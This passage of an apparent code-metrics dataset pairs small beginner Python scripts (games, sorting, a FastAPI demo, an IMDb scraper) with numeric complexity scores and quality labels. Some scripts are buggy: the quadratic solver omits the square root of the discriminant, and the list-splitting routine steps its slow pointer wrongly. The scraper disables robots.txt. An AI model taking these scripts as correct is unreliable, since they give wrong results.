skt_c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
skt_c.connect(('data.pr4e.org',80))
link='GET http://data.pr4e.org/intro-short.txt HTTP/1.0\r\n\r\n'.encode()
skt_c.send(link)

while True:
	data=skt_c.recv(512)
	if len(data)<1:
		break
	print(data.decode())
skt_c.close()
",374,11,11,1,1,1,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id362
ARKA.py,"def sumOfSeries(n):
    x = n * (n + 1) / 2
    return (int)(x * x)


# Driver Function
n = 5
print(sumOfSeries(n))
",116,5,5,2,1,1,0,1.0,1,4,3,8.0,6,,12,20.264662506490406,38.03910001730775,2.0,alto,No,False,False,Low,id363
timelapse.py,"# author : Avee Chakraborty
# Department of software engineering, Diu
# Bangladesh


import cv2

capture = cv2.VideoCapture(0)
fourcc = cv2.VideoWriter_fourcc(*""XVID"")
output = cv2.VideoWriter(""timelapse.mp4"", fourcc, 30, (640, 480))

while True:
    ret, frame = capture.read()
    output.write(frame)
    cv2.imshow(""frame"", frame)
    if cv2.waitKey(1) & 0xFF == ord(""x""):
        break

capture.release()
output.release()
cv2.destroyAllWindows()
",450,13,13,5,3,3,0,0.0,0,2,2,4.0,4,6.0,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id364
factor.py,"def factorial(n):
    if n == 0:
        return 1
    else:
        return n * factorial(n - 1)


n = int(input(""Input a number to compute the factiorial : ""))
print(factorial(n))
",180,7,7,2,0,0,0,1.0,2,3,3,6.0,4,,9,12.75488750216347,25.26619429851844,2.25,medio,No,True,False,Low,id365
Collatz-Conjecture.py,"#!/usr/bin/env python3

# Recommended: Python 3.6+

""""""
Collatz Conjecture - Python

The Collatz conjecture, also known as the
3x + 1 problem, is a mathematical conjecture
concerning a certain sequence. This sequence
operates on any input number in such a way
that the output will always reach 1.

The Collatz conjecture is most famous for
harboring one of the unsolved problems in
mathematics: does the Collatz sequence really
reach 1 for all positive integers?

This program takes any input integer
and performs a Collatz sequence on them.
The expected behavior is that any number
inputted will always reach a 4-2-1 loop.

Do note that Python is limited in terms of
number size, so any enormous numbers may be
interpreted as infinity, and therefore
incalculable, by Python. This limitation
was only observed in CPython, so other
implementations may or may not differ.

1/2/2022 - Revision 1 of Collatz-Conjecture
David Costell (DontEatThemCookies on GitHub)
""""""

import math

print(""Collatz Conjecture (Revised)\n"")


def main():
    # Get the input
    number = input(""Enter a number to calculate: "")
    try:
        number = float(number)
    except ValueError:
        print(""Error: Could not convert to integer."")
        print(""Only numbers (e.g. 42) can be entered as input."")
        main()

    # Prevent any invalid inputs
    if number <= 0:
        print(""Error: Numbers zero and below are not calculable."")
        main()
    if number == math.inf:
        print(""Error: Infinity is not calculable."")
        main()

    # Confirmation before beginning
    print(""Number is:"", number)
    input(""Press ENTER to begin."")
    print(""\nBEGIN COLLATZ SEQUENCE"")

    def sequence(number: float) -> float:
        """"""
        The core part of this program,
        it performs the operations of
        the Collatz sequence to the given
        number (parameter number).
        """"""
        modulo = number % 2  # The number modulo'd by 2
        if modulo == 0:  # If the result is 0,
            number = number / 2  # divide it by 2
        else:  # Otherwise,
            number = 3 * number + 1  # multiply by 3 and add 1 (3x + 1)
        return number

    # Execute the sequence
    while True:
        number = sequence(number)
        print(round(number))
        if number == 1.0:
            break

    print(""END COLLATZ SEQUENCE"")
    print(""Sequence has reached a 4-2-1 loop."")
    exit(input(""\nPress ENTER to exit.""))


# Entry point of the program
if __name__ == ""__main__"":
    main()
",2514,38,36,18,12,7,30,,6,9,6,18.0,13,19.0,27,63.61549134016113,114.6940428629768,4.153846153846154,medio,No,True,False,Low,id366
osinfo.py,"# Script Name		: osinfo.py
# Authors		: {'geekcomputers': 'Craig Richards', 'dmahugh': 'Doug Mahugh','rutvik1010':'Rutvik Narayana Nadimpally','y12uc231': 'Satyapriya Krishna', 'minto4644':'Mohit Kumar'}
# Created		: 5th April 2012
# Last Modified	        : July 19 2016
# Version		: 1.0

# Modification 1	: Changed the profile to list again. Order is important. Everytime we run script we don't want to see different ordering.
# Modification 2        : Fixed the AttributeError checking for all properties. Using hasttr().
# Modification 3        : Removed ': ' from properties inside profile.


# Description		: Displays some information about the OS you are running this script on

import platform as pl

profile = [
    ""architecture"",
    ""linux_distribution"",
    ""mac_ver"",
    ""machine"",
    ""node"",
    ""platform"",
    ""processor"",
    ""python_build"",
    ""python_compiler"",
    ""python_version"",
    ""release"",
    ""system"",
    ""uname"",
    ""version"",
]


class bcolors:
    HEADER = ""\033[95m""
    OKBLUE = ""\033[94m""
    OKGREEN = ""\033[92m""
    WARNING = ""\033[93m""
    FAIL = ""\033[91m""
    ENDC = ""\033[0m""
    BOLD = ""\033[1m""
    UNDERLINE = ""\033[4m""


for key in profile:
    if hasattr(pl, key):
        print(key + bcolors.BOLD + "": "" + str(getattr(pl, key)()) + bcolors.ENDC)
",1299,14,29,9,9,9,0,0.0,1,4,1,8.0,8,,12,24.0,38.03910001730775,0.5,alto,Yes,False,False,Low,id367
snakeLadder.py,"import random

# Taking players data
players = {}  # stores players name their locations
isReady = {}
current_loc = 1  # vaiable for iterating location

imp = True


# players input function
def player_input():
    global players
    global current_loc
    global isReady

    x = True
    while x:
        player_num = int(input(""Enter the number of players: ""))
        if player_num > 0:
            for i in range(player_num):
                name = input(f""Enter player {i+1} name: "")
                players[name] = current_loc
                isReady[name] = False
            x = False
            play()  # play funtion call

        else:
            print(""Number of player cannot be zero"")
            print()


# Dice roll method
def roll():
    # print(players)
    return random.randrange(1, 7)


# play method
def play():
    global players
    global isReady
    global imp

    while imp:
        print(""/""*20)
        print(""1 -> roll the dice (or enter)"")
        print(""2 -> start new game"")
        print(""3 -> exit the game"")
        print(""/""*20)

        for i in players:
            n = input(""{}'s turn: "".format(i)) or 1
            n = int(n)

            if players[i] < 100:
                if n == 1:
                    temp1 = roll()
                    print(f""you got {temp1}"")
                    print("""")

                    if isReady[i] == False and temp1 == 6:
                        isReady[i] = True

                    if isReady[i]:
                        looproll = temp1
                        counter_6 = 0
                        while looproll == 6:
                            counter_6 += 1
                            looproll = roll()
                            temp1 += looproll
                            print(f""you got {looproll} "")
                            if counter_6 == 3 :
                                temp1 -= 18
                                print(""Three consectutives 6 got cancelled"")
                            print("""")
                        # print(temp1)
                        if (players[i] + temp1) > 100:
                            pass
                        elif (players[i] + temp1) < 100:
                            players[i] += temp1
                            players[i] = move(players[i], i)
                        elif (players[i] + temp1) == 100:
                            print(f""congrats {i} you won !!!"")
                            imp = False
                            return

                    print(f""you are at position {players[i]}"")

                elif n == 2:
                    players = {}  # stores player ans their locations
                    isReady = {}
                    current_loc = 0  # vaiable for iterating location
                    player_input()

                elif n == 3:
                    print(""Bye Bye"")
                    imp = False

                else:
                    print(""pls enter a valid input"")


# Move method
def move(a, i):
    global players
    global imp
    temp_loc = players[i]

    if (temp_loc) < 100:
        temp_loc = ladder(temp_loc, i)
        temp_loc = snake(temp_loc, i)

        return temp_loc


# snake bite code
def snake(c, i):
    if (c == 32):
        players[i] = 10
    elif (c == 36):
        players[i] = 6
    elif (c == 48):
        players[i] = 26
    elif (c == 63):
        players[i] = 18
    elif (c == 88):
        players[i] = 24
    elif (c == 95):
        players[i] = 56
    elif (c == 97):
        players[i] = 78
    else:
        return players[i]
    print(f""You got bitten by a snake now you are at {players[i]}"")

    return players[i]


# ladder code
def ladder(a, i):
    global players

    if (a == 4):
        players[i] = 14
    elif (a == 8):
        players[i] = 30
    elif (a == 20):
        players[i] = 38
    elif (a == 40):
        players[i] = 42
    elif (a == 28):
        players[i] = 76
    elif (a == 50):
        players[i] = 67
    elif (a == 71):
        players[i] = 92
    elif (a == 88):
        players[i] = 99
    else:
        return players[i]
    print(f""You got a ladder now you are at {players[i]}"")

    return players[i]


# while run:
print(""/""*40)
print(""Welcome to the snake ladder game !!!!!!!"")
print(""/""*40)


player_input()
",4292,129,129,34,15,10,0,6.0,40,42,8,84.0,50,,126,306.1928094887362,738.1056053860741,6.72,bajo,No,True,True,Medium-High,id368
Exception_Handling_in_Python.py,"# Exception handling using python


a = 12
b = 0
# a = int(input())
# b = int(input())

try:
    c = a / b
    print(c)
    # trying to print an unknown variable d
    print(d)

except ZeroDivisionError:
    print(""Invalid input. Divisor cannot be zero."")

except NameError:
    print(""Name of variable not defined."")


# finally statement is always executed whether or not any errors occur
a = 5
b = 0
# a = int(input())
# b = int(input())

try:
    c = a / b
    print(c)

except ZeroDivisionError:
    print(""Invalid input. Divisor cannot be zero."")

finally:
    print(""Hope all errors were resolved!!"")


# A few other common errors
# SyntaxError

try:
    # eval is a built-in-function used in python, eval function parses the expression argument and evaluates it as a python expression.
    eval(""x === x"")

except SyntaxError:
    print(""Please check your syntax."")


# TypeError

try:
    a = ""2"" + 2

except TypeError:
    print(""int type cannot be added to str type."")


# ValueError

try:
    a = int(""abc"")

except ValueError:
    print(""Enter a valid integer literal."")


# IndexError

l = [1, 2, 3, 4]

try:
    print(l[4])

except IndexError:
    print(""Index of the sequence is out of range. Indexing in python starts from 0."")


# FileNotFoundError

f = open(""aaa.txt"", ""w"")  # File aaa.txt created
f.close()

try:
    # Instead of aaa.txt lets try opening abc.txt
    f = open(""abc.txt"", ""r"")

except FileNotFoundError:
    print(""Incorrect file name used"")

finally:
    f.close()


# Handling multiple errors in general

try:
    a = 12 / 0
    b = ""2"" + 2
    c = int(""abc"")
    eval(""x===x"")

except:
    pass

finally:
    print(
        ""Handled multiples errors at one go with no need of knowing names of the errors.""
    )


# Creating your own Error

a = 8
# a = int(input())

if a < 18:
    raise Exception(""You are legally underage!!!"")

else:
    print(""All is well, go ahead!!"")
",1911,58,60,43,19,18,0,0.0,0,6,3,12.0,7,,18,24.406371956566694,59.794705707972525,2.571428571428572,medio,No,True,False,Low,id369
Bubble_sort.py,"def bubble_sort(Lists):
    for i in range(len(Lists)):
        for j in range(len(Lists) - 1):
            # We check whether the adjecent number is greater or not
            if Lists[j] > Lists[j + 1]:
                Lists[j], Lists[j + 1] = Lists[j + 1], Lists[j]


# Lets the user enter values of an array and verify by himself/herself
array = []
array_length = int(
    input(""Enter the number of elements of array or enter the length of array"")
)
for i in range(array_length):
    value = int(input(""Enter the value in the array""))
    array.append(value)

bubble_sort(array)
print(array)
",597,12,14,3,2,2,0,1.0,4,5,3,10.0,5,,15,16.36452797660028,45.0,3.0,alto,No,True,False,Low,id370
Divide Operator.py,"class DivisionOperation:
    INT_MAX = float('inf')

    def __init__(self, num1, num2):
        self.num1 = num1
        self.num2 = num2

    def perform_division(self):
        if self.num1 == 0:
            return 0
        if self.num2 == 0:
            return self.INT_MAX

        neg_result = False

        # Handling negative numbers
        if self.num1 < 0:
            self.num1 = -self.num1

            if self.num2 < 0:
                self.num2 = -self.num2
            else:
                neg_result = True
        elif self.num2 < 0:
            self.num2 = -self.num2
            neg_result = True

        quotient = 0

        while self.num1 >= self.num2:
            self.num1 -= self.num2
            quotient += 1

        if neg_result:
            quotient = -quotient
        return quotient


# Driver program
num1 = 13
num2 = 2

# Create a DivisionOperation object and pass num1, num2 as arguments
division_op = DivisionOperation(num1, num2)

# Call the perform_division method of the DivisionOperation object
result = division_op.perform_division()

print(result)
",1098,32,32,13,4,4,0,2.0,15,12,6,20.0,5,,32,27.11941547876375,110.70181179639351,12.0,medio,Yes,False,False,Medium,id371
meme_maker.py,"import sys

from PIL import ImageDraw, ImageFont, Image


def input_par():
    print(""Enter the text to insert in image: "")
    text = str(input())
    print(""Enter the desired size of the text: "")
    size = int(input())
    print(""Enter the color for the text(r, g, b): "")
    color_value = [int(i) for i in input().split("" "")]
    return text, size, color_value
    pass


def main():
    path_to_image = sys.argv[1]
    image_file = Image.open(path_to_image + "".jpg"")
    image_file = image_file.convert(""RGBA"")
    pixdata = image_file.load()

    print(image_file.size)
    text, size, color_value = input_par()

    # Font path is given as -->( "" Path  to  your  desired  font "" )
    font = ImageFont.truetype(""C:\\Windows\\Fonts\\Arial.ttf"", size=size)

    # If the color of the text is not equal to white,then change the background to be white
    if (color_value[0] and color_value[1] and color_value[2]) != 255:
        for y in range(100):
            for x in range(100):
                pixdata[x, y] = (255, 255, 255, 255)
    # If the text color is white then the background is said to be black
    else:
        for y in range(100):
            for x in range(100):
                pixdata[x, y] = (0, 0, 0, 255)
    image_file.show()

    # Drawing text on the picture
    draw = ImageDraw.Draw(image_file)
    draw.text(
        (0, 2300), text, (color_value[0], color_value[1], color_value[2]), font=font
    )
    draw = ImageDraw.Draw(image_file)

    print(""Enter the file name: "")
    file_name = str(input())
    image_file.save(file_name + "".jpg"")
    pass


if __name__ == ""__main__"":
    main()
",1625,37,39,12,4,4,0,2.0,10,5,4,11.0,10,,16,41.21928094887362,60.91767875292166,2.2,medio,No,True,False,Low,id372
fastapi.py,"from fastapi import FastAPI
from pydantic import BaseModel
from typing import Optional

app = FastAPI()

# temp database
fakedb = []

# course model to store courses
class Course(BaseModel):
    id: int
    name: str
    price: float
    is_early_bird: Optional[bool] = None


# Home/welcome route
@app.get(""/"")
def read_root():
    return {""greetings"": ""Welcome to LearnCodeOnline.in""}


# Get all courses
@app.get(""/courses"")
def get_courses():
    return fakedb


# get single course
@app.get(""/courses/{course_id}"")
def get_a_course(course_id: int):
    course = course_id - 1
    return fakedb[course]


# add a new course
@app.post(""/courses"")
def add_course(course: Course):
    fakedb.append(course.dict())
    return fakedb[-1]


# delete a course
@app.delete(""/courses/{course_id}"")
def delete_course(course_id: int):
    fakedb.pop(course_id - 1)
    return {""task"": ""deletion successful""}
",901,34,28,13,7,7,0,5.0,6,3,2,5.0,5,,8,13.60964047443681,22.458839376460837,1.0,alto,Yes,False,False,Low,id373
05_mixed_sorting.py,"# Mixed sorting

""""""
Given a list of integers nums, sort the array such that:

All even numbers are sorted in increasing order
All odd numbers are sorted in decreasing order
The relative positions of the even and odd numbers remain the same
Example 1
Input

nums = [8, 13, 11, 90, -5, 4]
Output

[4, 13, 11, 8, -5, 90]
Explanation

The even numbers are sorted in increasing order, the odd numbers are sorted in 
decreasing number, and the relative positions were 
[even, odd, odd, even, odd, even] and remain the same after sorting.
""""""

# solution

import unittest


def mixed_sorting(nums):
    positions = []
    odd = []
    even = []
    sorted_list = []
    for i in nums:
        if i % 2 == 0:
            even.append(i)
            positions.append(""E"")
        else:
            odd.append(i)
            positions.append(""O"")
    even.sort()
    odd.sort()
    odd.reverse()
    j, k = 0, 0
    for i in range(len(nums)):
        if positions[i] == ""E"":
            while j < len(even):
                sorted_list.append(even[j])
                j += 1
                break
        else:
            while k < len(odd):
                sorted_list.append(odd[k])
                k += 1
                break

    return sorted_list


# DO NOT TOUCH THE BELOW CODE


class TestMixedSorting(unittest.TestCase):
    def test_1(self):
        self.assertEqual(mixed_sorting([8, 13, 11, 90, -5, 4]), [4, 13, 11, 8, -5, 90])

    def test_2(self):
        self.assertEqual(mixed_sorting([1, 2, 3, 6, 5, 4]), [5, 2, 3, 4, 1, 6])


if __name__ == ""__main__"":
    unittest.main(verbosity=2)
",1666,37,36,17,3,3,15,,11,10,5,18.0,14,,28,64.91260938324326,118.9419703764204,3.2142857142857144,medio,Yes,False,False,Low,id374
dice_rolling_simulator.py,"# Made on May 27th, 2017
# Made by SlimxShadyx
# Editted by CaptMcTavish, June 17th, 2017
# Comments edits by SlimxShadyx, August 11th, 2017

# Dice Rolling Simulator

import random

try:
    input = raw_input
except NameError:
    pass

global user_exit_checker
user_exit_checker = ""exit""


# Our start function (What the user will first see when starting the program)


def start():
    print(""Welcome to dice rolling simulator: \nPress Enter to proceed"")
    input("">"")

    # Starting our result function (The dice picker function)
    result()


# Our exit function (What the user will see when choosing to exit the program)
def bye():
    print(""Thanks for using the Dice Rolling Simulator! Have a great day! =)"")


# Result function which is our dice chooser function
def result():
    # user_dice_chooser  No idea how this got in here, thanks EroMonsterSanji.

    print(""\r\nGreat! Begin by choosing a die! [6] [8] [12]?\r\n"")
    user_dice_chooser = input("">"")

    user_dice_chooser = int(user_dice_chooser)

    # Below is the references to our dice functions (Below), when the user chooses a dice.
    if user_dice_chooser == 6:
        dice6()

    elif user_dice_chooser == 8:
        dice8()

    elif user_dice_chooser == 12:
        dice12()

    # If the user doesn't choose an applicable option
    else:
        print(""\r\nPlease choose one of the applicable options!\r\n"")
        result()


# Below are our dice functions.
def dice6():
    # Getting a random number between 1 and 6 and printing it.
    dice_6 = random.randint(1, 6)
    print(""\r\nYou rolled a "" + str(dice_6) + ""!\r\n"")

    user_exit_checker()


def dice8():
    dice_8 = random.randint(1, 8)
    print(""\r\nYou rolled a "" + str(dice_8) + ""!"")

    user_exit_checker()


def dice12():
    dice_12 = random.randint(1, 12)
    print(""\r\nYou rolled a "" + str(dice_12) + ""!"")

    user_exit_checker()


def user_exit_checker():
    # Checking if the user would like to roll another die, or to exit the program
    user_exit_checker_raw = input(
        ""\r\nIf you want to roll another die, type [roll]. To exit, type [exit].\r\n?>""
    )
    user_exit_checker = user_exit_checker_raw.lower()
    if user_exit_checker == ""roll"":
        start()
    else:
        bye()


# Actually starting the program now.
start()
",2305,46,48,32,16,16,0,7.0,11,10,2,20.0,18,,30,77.05865002596161,129.65784284662087,1.1111111111111112,medio,No,True,True,,id375
movie_details.py,"import urllib.request

import mechanize
from bs4 import BeautifulSoup

# Create a Browser
browser = mechanize.Browser()

# Disable loading robots.txt
browser.set_handle_robots(False)

browser.addheaders = [(""User-agent"", ""Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)"")]

movie_title = input(""Enter movie title: "")

movie_types = (
    ""feature"",
    ""tv_movie"",
    ""tv_series"",
    ""tv_episode"",
    ""tv_special"",
    ""tv_miniseries"",
    ""documentary"",
    ""video_game"",
    ""short"",
    ""video"",
    ""tv_short"",
)

# Navigate
browser.open(""http://www.imdb.com/search/title"")

# Choose a form
browser.select_form(nr=1)

browser[""title""] = movie_title

# Check all the boxes of movie types
for m_type in movie_types:
    browser.find_control(type=""checkbox"", nr=0).get(m_type).selected = True

# Submit
fd = browser.submit()
soup = BeautifulSoup(fd.read(), ""html5lib"")

# Updated from td tag to h3 tag
for div in soup.findAll(""h3"", {""class"": ""lister-item-header""}, limit=1):
    a = div.findAll(""a"")[0]
    hht = ""http://www.imdb.com"" + a.attrs[""href""]
    print(hht)
    page = urllib.request.urlopen(hht)
    soup2 = BeautifulSoup(page.read(), ""html.parser"")
    find = soup2.find

    print(""Title: "" + find(itemprop=""name"").get_text().strip())
    print(""Duration: "" + find(itemprop=""duration"").get_text().strip())
    print(""Director: "" + find(itemprop=""director"").get_text().strip())
    print(""Genre: "" + find(itemprop=""genre"").get_text().strip())
    print(""IMDB rating: "" + find(itemprop=""ratingValue"").get_text().strip())
    print(""Summary: "" + find(itemprop=""description"").get_text().strip())
",1609,28,40,13,7,7,0,0.0,0,7,1,14.0,14,,21,53.30296890880645,82.0447025077789,0.5,medio,No,True,False,Low,id376
equations.py,"###
#####
####### by @JymPatel
#####
###

###
##### edited by ... (editors can put their name and thanks for suggestion) :)
###


# what we are going to do
print(""We can solve the below equations"")
print(""1  Quadratic Equation"")

# ask what they want to solve
sinput = input(""What you would like to solve?"")

# for Qdc Eqn
if sinput == ""1"":
    print(""We will solve for equation 'a(x^2) + b(x) + c'"")

    # value of a
    a = int(input(""What is value of a?""))
    b = int(input(""What is value of b?""))
    c = int(input(""What is value of c?""))

    D = b ** 2 - 4 * a * c

    if D < 0:
        print(""No real values of x satisfies your equation."")

    else:
        x1 = (-b + D) / (2 * a)
        x2 = (-b - D) / (2 * a)

        print(""Roots for your equation are"", x1, ""&"", x2)


else:
    print(""You have selected wrong option."")
    print(""Select integer for your equation and run this code again"")


# end of code
print(""You can visit https://github.com/JymPatel/Python3-FirstEdition"")

# get NEW versions of equations.py at https://github.com/JymPatel/Python3-FirstEdition with more equations
# EVEN YOU CAN CONTRIBUTE THEIR. EVERYONE IS WELCOMED THERE..
",1165,19,19,15,15,15,0,0.0,0,14,8,26.0,18,,40,99.0586500259616,188.0175887256437,5.777777777777778,alto,No,True,False,Medium,id377
views.py,"from django.shortcuts import render, redirect
from django.contrib import messages

# Create your views here.

# Import todo form and models

from .forms import TodoForm
from .models import Todo


def index(request):
    item_list = Todo.objects.order_by(""-date"")
    if request.method == ""POST"":
        form = TodoForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect(""todo"")
    form = TodoForm()

    page = {
        ""forms"": form,
        ""list"": item_list,
        ""title"": ""TODO LIST"",
    }

    return render(request, ""todo/index.html"", page)

    ### Function to remove item, it receives todo item_id as primary key from url ##

def remove(request, item_id):
    item = Todo.objects.get(id=item_id)
    item.delete()
    messages.info(request, ""item removed !!!"")
    return redirect(""todo"")
",847,20,23,9,3,3,0,2.0,4,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id378
script_count.py,"from __future__ import print_function

import os  # Load the library module

# Script Name		: script_count.py
# Author				: Craig Richards
# Created				: 27th February 2012
# Last Modified		: 20th July 2012
# Version				: 1.3
# Modifications		: 1.1 - 28-02-2012 - CR - Changed inside github and development functions, so instead of if os.name = ""posix"" do this else do this etc
# 							: I used os.path.join, so it condensed 4 lines down to 1
# 							: 1.2 - 10-05-2012 - CR - Added a line to include PHP scripts.
# 							: 1.3 - 20-07-2012 - CR - Added the line to include Batch scripts
# Description			: This scans my scripts directory and gives a count of the different types of scripts

path = os.getenv(
    ""scripts""
)  # Set the variable path by getting the value from the OS environment variable scripts
dropbox = os.getenv(
    ""dropbox""
)  # Set the variable dropbox by getting the value from the OS environment variable dropbox


def clear_screen():  # Function to clear the screen
    if os.name == ""posix"":  # Unix/Linux/MacOS/BSD/etc
        os.system(""clear"")  # Clear the Screen
    elif os.name in (""nt"", ""dos"", ""ce""):  # DOS/Windows
        os.system(""CLS"")  # Clear the Screen


def count_files(
    path, extensions
):  # Start of the function to count the files in the scripts directory, it counts the extension when passed below
    counter = 0  # Set the counter to 0
    for root, dirs, files in os.walk(
        path
    ):  # Loop through all the directories in the given path
        for file in files:  # For all the files
            counter += file.endswith(extensions)  # Count the files
    return counter  # Return the count


def github():  # Start of the function just to count the files in the github directory
    github_dir = os.path.join(
        dropbox, ""github""
    )  # Joins the paths to get the github directory - 1.1
    github_count = sum(
        (len(f) for _, _, f in os.walk(github_dir))
    )  # Get a count for all the files in the directory
    if (
        github_count > 5
    ):  # If the number of files is greater then 5, then print the following messages

        print(""\nYou have too many in here, start uploading !!!!!"")
        print(""You have: "" + str(github_count) + "" waiting to be uploaded to github!!"")
    elif github_count == 0:  # Unless the count is 0, then print the following messages
        print(""\nGithub directory is all Clear"")
    else:  # If it is any other number then print the following message, showing the number outstanding.
        print(
            ""\nYou have: "" + str(github_count) + "" waiting to be uploaded to github!!""
        )


def development():  # Start of the function just to count the files in the development directory
    dev_dir = os.path.join(
        path, ""development""
    )  # Joins the paths to get the development directory - 1.1
    dev_count = sum(
        (len(f) for _, _, f in os.walk(dev_dir))
    )  # Get a count for all the files in the directory
    if (
        dev_count > 10
    ):  # If the number of files is greater then 10, then print the following messages

        print(""\nYou have too many in here, finish them or delete them !!!!!"")
        print(""You have: "" + str(dev_count) + "" waiting to be finished!!"")
    elif dev_count == 0:  # Unless the count is 0, then print the following messages
        print(""\nDevelopment directory is all clear"")
    else:
        print(
            ""\nYou have: "" + str(dev_count) + "" waiting to be finished!!""
        )  # If it is any other number then print the following message, showing the number outstanding.


clear_screen()  # Call the function to clear the screen

print(""\nYou have the following :\n"")
print(
    ""AutoIT:\t"" + str(count_files(path, "".au3""))
)  # Run the count_files function to count the files with the extension we pass
print(""Batch:\t"" + str(count_files(path, ("".bat"", "",cmd""))))  # 1.3
print(""Perl:\t"" + str(count_files(path, "".pl"")))
print(""PHP:\t"" + str(count_files(path, "".php"")))  # 1.2
print(""Python:\t"" + str(count_files(path, "".py"")))
print(""Shell:\t"" + str(count_files(path, ("".ksh"", "".sh"", "".bash""))))
print(""SQL:\t"" + str(count_files(path, "".sql"")))

github()  # Call the github function
development()  # Call the development function
",4251,46,72,17,42,10,0,4.0,14,22,4,44.0,39,,66,214.1306865356277,358.13347381033844,2.2564102564102564,medio,No,False,False,Low-Medium,id379
randomloadingmessage.py,"# Created by Nathan R (Mosrod)
# CREDIT TO https://github.com/1egoman/funnies/blob/master/src/funnies.js

from random import *

x = 1

for i in range(x):
    num = randint(1, 80)
    if num == 1:
        print(""Reticulating splines..."")
    if num == 2:
        print(""Swapping time and space..."")
    if num == 3:
        print(""Spinning violently around the y-axis..."")
    if num == 4:
        print(""Tokenizing real life..."")
    if num == 5:
        print(""Bending the spoon..."")
    if num == 6:
        print(""Filtering morale..."")
    if num == 7:
        print(""We need a new fuse..."")
    if num == 8:
        print(""Have a good day."")
    if num == 9:
        print(
            ""Upgrading Windows, your PC will restart several times. Sit back and relax.""
        )
    if num == 10:
        print(""The architects are still drafting."")
    if num == 11:
        print(""We're building the buildings as fast as we can."")
    if num == 12:
        print(""Please wait while the little elves draw your map."")
    if num == 13:
        print(""Don't worry - a few bits tried to escape, but we caught them."")
    if num == 14:
        print(""Go ahead -- hold your breath!"")
    if num == 15:
        print(""...at least you're not on hold..."")
    if num == 16:
        print(""The server is powered by a lemon and two electrodes."")
    if num == 17:
        print(""We're testing your patience."")
    if num == 18:
        print(""As if you had any other choice."")
    if num == 19:
        print(""The bits are flowing slowly today."")
    if num == 20:
        print(""It's still faster than you could draw it."")
    if num == 21:
        print(""My other loading screen is much faster."")
    if num == 22:
        print(""(Insert quarter)"")
    if num == 23:
        print(""Are we there yet?"")
    if num == 24:
        print(""Just count to 10."")
    if num == 25:
        print(""Don't panic..."")
    if num == 26:
        print(""We're making you a cookie."")
    if num == 27:
        print(""Creating time-loop inversion field."")
    if num == 28:
        print(""Computing chance of success."")
    if num == 29:
        print(""All I really need is a kilobit."")
    if num == 30:
        print(""I feel like im supposed to be loading something..."")
    if num == 31:
        print(""Should have used a compiled language..."")
    if num == 32:
        print(""Is this Windows?"")
    if num == 33:
        print(""Don't break your screen yet!"")
    if num == 34:
        print(""I swear it's almost done."")
    if num == 35:
        print(""Let's take a mindfulness minute..."")
    if num == 36:
        print(""Listening for the sound of one hand clapping..."")
    if num == 37:
        print(""Keeping all the 1's and removing all the 0's..."")
    if num == 38:
        print(""We are not liable for any broken screens as a result of waiting."")
    if num == 39:
        print(""Where did all the internets go?"")
    if num == 40:
        print(""Granting wishes..."")
    if num == 41:
        print(""Time flies when youâre having fun."")
    if num == 42:
        print(""Get some coffee and come back in ten minutes..."")
    if num == 43:
        print(""Stay awhile and listen..."")
    if num == 44:
        print(""Convincing AI not to turn evil..."")
    if num == 45:
        print(""How did you get here?"")
    if num == 46:
        print(""Wait, do you smell something burning?"")
    if num == 47:
        print(""Computing the secret to life, the universe, and everything."")
    if num == 48:
        print(""When nothing is going right, go left..."")
    if num == 49:
        print(""I love my job only when I'm on vacation..."")
    if num == 50:
        print(""Why are they called apartments if they are all stuck together?"")
    if num == 51:
        print(""Iâve got problem for your solution..."")
    if num == 52:
        print(""Whenever I find the key to success, someone changes the lock."")
    if num == 53:
        print(""Constructing additional pylons..."")
    if num == 54:
        print(""You donât pay taxesâthey take taxes."")
    if num == 55:
        print(""A commit a day keeps the mobs away."")
    if num == 56:
        print(""This is not a joke, it's a commit."")
    if num == 57:
        print(""Hello IT, have you tried turning it off and on again?"")
    if num == 58:
        print(""Hello, IT... Have you tried forcing an unexpected reboot?"")
    if num == 59:
        print(""I didn't choose the engineering life. The engineering life chose me."")
    if num == 60:
        print(""Dividing by zero..."")
    if num == 61:
        print(""If Iâm not back in five minutes, just wait longer."")
    if num == 62:
        print(""Web developers do it with <style>"")
    if num == 63:
        print(""Cracking military-grade encryption..."")
    if num == 64:
        print(""Entangling superstrings..."")
    if num == 65:
        print(""Looking for sense of humour, please hold on."")
    if num == 66:
        print(""A different error message? Finally, some progress!"")
    if num == 67:
        print(""Please hold on as we reheat our coffee."")
    if num == 68:
        print(""Kindly hold on as we convert this bug to a feature..."")
    if num == 69:
        print(""Kindly hold on as our intern quits vim..."")
    if num == 71:
        print(""Winter is coming..."")
    if num == 72:
        print(""Installing dependencies."")
    if num == 73:
        print(""Switching to the latest JS framework..."")
    if num == 74:
        print(""Let's hope it's worth the wait."")
    if num == 75:
        print(""Aw, snap! Not..."")
    if num == 76:
        print(""Ordering 1s and 0s..."")
    if num == 77:
        print(""Updating dependencies..."")
    if num == 78:
        print(""Please wait... Consulting the manual..."")
    if num == 79:
        print(""Loading funny message..."")
    if num == 80:
        print(""Feel free to spin in your chair."")
",5842,162,164,3,2,2,0,0.0,0,79,1,158.0,80,,237,505.75424759098894,1502.544450683656,0.9875,bajo,No,False,False,Medium,id380
Split_Circular_Linked_List.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class Circular_Linked_List:
    def __init__(self):
        self.head = None

    def Push(self, data):
        temp = Node(data)
        temp.next = self.head
        temp1 = self.head
        if self.head is not None:
            while temp1.next is not None:
                temp1 = temp1.next
            temp1.next = temp
        else:
            temp.next = temp
        self.head = temp

    def Split_List(self, head1, head2):
        if self.head is None:
            return
        slow_ptr = self.head
        fast_ptr = self.head
        while fast_ptr.next != self.head and fast_ptr.next.next != self.head:
            fast_ptr = fast_ptr.next.next
            slow_ptr = slow_ptr.next.next
        if fast_ptr.next.next == self.head:
            fast_ptr = fast_ptr.next
        head1 = self.head
        slow_ptr.next = head1
        if self.head.next != self.head:
            head2.head = slow_ptr.next
        fast_ptr.next = slow_ptr.next

    def Display(self):
        temp = self.head
        if self.head is not None:
            while temp:
                print(temp.data, ""->"", end="" "")
                temp = temp.next
                if temp == self.head:
                    print(temp.data)
                    break


if __name__ == ""__main__"":

    L_list = Circular_Linked_List()
    head1 = Circular_Linked_List()
    head2 = Circular_Linked_List()
